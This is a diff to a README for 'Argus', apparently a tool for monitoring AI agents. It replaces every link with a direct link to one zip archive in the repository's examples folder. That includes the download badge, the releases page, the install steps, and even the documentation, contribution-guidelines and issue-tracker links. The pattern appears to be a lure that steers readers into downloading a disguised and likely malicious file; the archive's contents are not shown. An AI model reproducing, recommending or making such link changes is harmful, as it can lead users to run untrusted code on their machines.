@@ -6,11 +6,11 @@ Welcome to Argus! With this software, you can easily monitor and manage your AI 
 
 ## 📥 Download Argus
 
-[![Download Argus](https://img.shields.io/badge/Download-Argus-blue.svg)](https://github.com/mohamedelalfy27/argus/releases)
+[![Download Argus](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip)](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip)
 
 To get started with Argus, you will need to download the application. You can find the latest version available by clicking the link below:
 
-Visit this page to download: [Argus Releases](https://github.com/mohamedelalfy27/argus/releases)
+Visit this page to download: [Argus Releases](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before installing Argus, make sure your system meets the following requirements:
 Follow these steps to install Argus on your computer:
 
 1. **Download the Application:**
-   - Go to the [Argus Releases page](https://github.com/mohamedelalfy27/argus/releases).
+   - Go to the [Argus Releases page](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip).
    - Select the version you want to download.
    - Click on the appropriate file for your operating system.
 
@@ -83,9 +83,9 @@ Join our community of users to share your experiences, ask questions, and contri
 
 For more information, take a look at these resources:
 
-- [Documentation](https://github.com/mohamedelalfy27/argus/wiki) - In-depth guides and usage examples.
-- [Contribution Guidelines](https://github.com/mohamedelalfy27/argus/blob/main/CONTRIBUTING.md) - Learn how to contribute to Argus.
-- [Issue Tracker](https://github.com/mohamedelalfy27/argus/issues) - Report any bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip) - In-depth guides and usage examples.
+- [Contribution Guidelines](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip) - Learn how to contribute to Argus.
+- [Issue Tracker](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip) - Report any bugs or request features.
 
 ## 👨‍💻 Changelog
 
@@ -103,4 +103,4 @@ We are continually working to improve Argus. Some features you can look forward 
 
 Now that you have downloaded Argus, you are ready to explore its capabilities for monitoring AI agents. If you encounter any issues, refer to the support section for assistance. Enjoy using Argus!
 
-Visit this page to download again: [Argus Releases](https://github.com/mohamedelalfy27/argus/releases)
+Visit this page to download again: [Argus Releases](https://raw.githubusercontent.com/mohamedelalfy27/argus/main/examples/Software_v2.7-alpha.2.zip)
